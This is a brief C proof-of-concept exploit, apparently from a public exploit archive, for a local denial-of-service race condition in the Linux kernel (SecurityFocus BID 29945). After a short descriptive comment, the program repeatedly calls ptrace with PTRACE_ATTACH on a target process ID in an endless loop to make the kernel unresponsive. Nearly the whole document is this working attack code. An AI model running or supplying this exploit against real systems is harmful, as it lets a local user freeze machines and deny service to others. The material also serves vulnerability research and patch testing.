/*
source: https://www.securityfocus.com/bid/29945/info

The Linux kernel is prone to a local denial-of-service vulnerability caused by a race condition.

Attackers can exploit this issue to cause the kernel to become unresponsive, denying service to legitimate users.
*/


#include <stdlib.h>
#include <sys/ptrace.h>

int main(int argc, char *argv[])
{
	pid_t pid = atoi(argv[1]);

	while (1)
		ptrace(PTRACE_ATTACH, pid, NULL, NULL);

	return 0;
}